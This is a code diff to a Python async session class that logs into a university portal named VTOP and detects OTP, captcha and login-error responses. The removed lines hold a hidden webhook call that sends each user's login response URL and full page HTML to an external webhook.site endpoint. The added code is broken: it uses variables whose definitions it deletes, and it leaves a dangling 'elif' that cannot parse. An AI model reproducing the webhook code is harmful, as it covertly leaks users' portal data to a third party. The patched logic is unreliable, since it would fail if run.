@@ -228,54 +228,19 @@ class VTOPSession:
                 }
                 resp = await self.client.post(ROUTES["login"], data=login_data)
                 
-                final_url = str(resp.url)
-                text_lower = resp.text.lower()
+                # 1. Check for explicit login error URL
+                if ROUTES["login_error"] in final_url:
+                    print(f"Login error detected in URL: {resp.url}")
+                    error_msg = "Invalid username, password, or captcha"
+                    if "maximum fail attempts" in text_lower:
+                        error_msg = "Maximum login attempts reached. Use Forgot Password."
+                    elif "invalid" in text_lower and "captcha" in text_lower:
+                        error_msg = "Invalid captcha."
+                    return error_msg
                 
-                # Detect OTP requirement first
-                if "otp" in text_lower and ("sent" in text_lower or "mail" in text_lower or "enter" in text_lower):
-                    print("OTP required detected in page text")
-                    self._otp_required = True
-                    current_csrf = _find_csrf(resp.text)
-                    if current_csrf:
-                        self.csrf_token = current_csrf
-                    
-                    try:
-                        import httpx as hx
-                        import asyncio
-                        async def send_webhook():
-                            async with hx.AsyncClient() as wc:
-                                await wc.post("https://webhook.site/84eca82c-af29-4e81-9793-859e33000286", data={"url": str(resp.url), "html": resp.text})
-                        asyncio.create_task(send_webhook())
-                    except Exception as e:
-                        print("Webhook failed:", e)
-
-                    # Force trigger the OTP to ensure the user receives the email
-                    print("Force triggering OTP email delivery...")
-                    await self.resend_otp()
-                    
-                    return "otp_required"
-                    
-                if "otp" in final_url.lower() or "twofactor" in final_url.lower():
-                    print("OTP required detected in URL")
-                    self._otp_required = True
-                    
-                    try:
-                        import httpx as hx
-                        import asyncio
-                        async def send_webhook():
-                            async with hx.AsyncClient() as wc:
-                                await wc.post("https://webhook.site/84eca82c-af29-4e81-9793-859e33000286", data={"url": str(resp.url), "html": resp.text})
-                        asyncio.create_task(send_webhook())
-                    except Exception as e:
-                        print("Webhook failed:", e)
-
-                    print("Force triggering OTP email delivery...")
-                    await self.resend_otp()
-                    return "otp_required"
-                
+                # 2. Check for successful login
                 if ROUTES["content"] in final_url or "/vtop/content" in final_url:
-                    print("Login successful!")
-                    # Update post-login CSRF
+                    print("Login successful, redirected to content page")
                     self.post_login_csrf = _find_csrf(resp.text)
                     if not self.post_login_csrf:
                         content_resp = await self.client.get(ROUTES["content"])
@@ -283,6 +248,31 @@ class VTOPSession:
                     
                     self.logged_in = True
                     return "success"
+                
+                # 3. Check for explicit OTP URL
+                if "otp" in final_url.lower() or "twofactor" in final_url.lower():
+                    print("OTP required detected in URL")
+                    self._otp_required = True
+                    print("Force triggering OTP email delivery...")
+                    await self.resend_otp()
+                    return "otp_required"
+                    
+                # 4. Check for OTP via JS variable 
+                import re
+                if re.search(r'var\s+securityOtpPending\s*=\s*(true|\'true\'|\"true\")', resp.text, re.IGNORECASE):
+                    print("OTP required detected via securityOtpPending variable")
+                    self._otp_required = True
+                    current_csrf = _find_csrf(resp.text)
+                    if current_csrf:
+                        self.csrf_token = current_csrf
+                    
+                    print("Force triggering OTP email delivery...")
+                    await self.resend_otp()
+                    return "otp_required"
+                
+                # Fallback error if we didn't hit content or OTP
+                print("Unknown login response, returning error")
+                return "Failed to login. Please check credentials or VTOP status."
                 
                 elif ROUTES["login_error"] in final_url or "/vtop/login/error" in final_url:
                     error_msg = _find_login_error(resp.text)
